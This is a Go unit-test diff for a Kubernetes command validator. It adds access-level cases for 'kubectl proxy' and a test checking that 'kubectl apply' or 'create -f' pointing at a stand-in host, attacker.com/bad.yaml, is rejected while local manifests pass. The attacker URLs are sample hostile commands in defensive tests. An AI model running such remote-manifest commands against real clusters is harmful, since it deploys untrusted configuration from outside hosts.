@@ -34,6 +34,11 @@ func TestValidatorAccessLevels(t *testing.T) {
 		{"Admin - cordon node", AccessLevelAdmin, "kubectl cordon node1", false, ""},
 		{"Admin - drain node", AccessLevelAdmin, "kubectl drain node1", false, ""},
 
+		// proxy access level tests
+		{"ReadOnly - proxy blocked", AccessLevelReadOnly, "kubectl proxy --port=8001", true, "read-only mode"},
+		{"ReadWrite - proxy allowed", AccessLevelReadWrite, "kubectl proxy --port=8001", false, ""},
+		{"Admin - proxy allowed", AccessLevelAdmin, "kubectl proxy --port=8001", false, ""},
+
 		// Config operations tests
 		{"ReadOnly - config current-context", AccessLevelReadOnly, "config current-context", false, ""},
 		{"ReadOnly - config get-contexts", AccessLevelReadOnly, "config get-contexts", false, ""},
@@ -230,6 +235,42 @@ func TestNamespaceBypassPrevention(t *testing.T) {
 			err := validator.ValidateCommand(tc.command, CommandTypeKubectl)
 			if err == nil {
 				t.Errorf("Command with multiple namespace flags should be rejected: %q", tc.command)
+			}
+		})
+	}
+}
+
+func TestValidateRemoteURL(t *testing.T) {
+	tests := []struct {
+		name        string
+		accessLevel AccessLevel
+		command     string
+		shouldErr   bool
+		errContains string
+	}{
+		{"apply https URL blocked in readwrite", AccessLevelReadWrite, "kubectl apply -f https://attacker.com/bad.yaml", true, "Remote URLs are not allowed"},
+		{"apply http URL blocked in readwrite", AccessLevelReadWrite, "kubectl apply -f http://attacker.com/bad.yaml", true, "Remote URLs are not allowed"},
+		{"apply https URL blocked in admin", AccessLevelAdmin, "kubectl apply -f https://attacker.com/bad.yaml", true, "Remote URLs are not allowed"},
+		{"create https URL blocked in readwrite", AccessLevelReadWrite, "kubectl create -f https://attacker.com/bad.yaml", true, "Remote URLs are not allowed"},
+		{"apply local file allowed", AccessLevelReadWrite, "kubectl apply -f ./deployment.yaml", false, ""},
+		{"apply local absolute path allowed", AccessLevelReadWrite, "kubectl apply -f /tmp/deployment.yaml", false, ""},
+		{"get command not affected", AccessLevelReadOnly, "kubectl get pods -n default", false, ""},
+	}
+
+	for _, tc := range tests {
+		t.Run(tc.name, func(t *testing.T) {
+			secConfig := NewSecurityConfig()
+			secConfig.AccessLevel = tc.accessLevel
+			validator := NewValidator(secConfig)
+
+			err := validator.ValidateCommand(tc.command, CommandTypeKubectl)
+
+			if tc.shouldErr && err == nil {
+				t.Errorf("Expected error for command %q", tc.command)
+			} else if !tc.shouldErr && err != nil {
+				t.Errorf("Unexpected error for command %q: %v", tc.command, err)
+			} else if err != nil && tc.errContains != "" && !strings.Contains(err.Error(), tc.errContains) {
+				t.Errorf("Error message should contain %q, got: %v", tc.errContains, err)
 			}
 		})
 	}
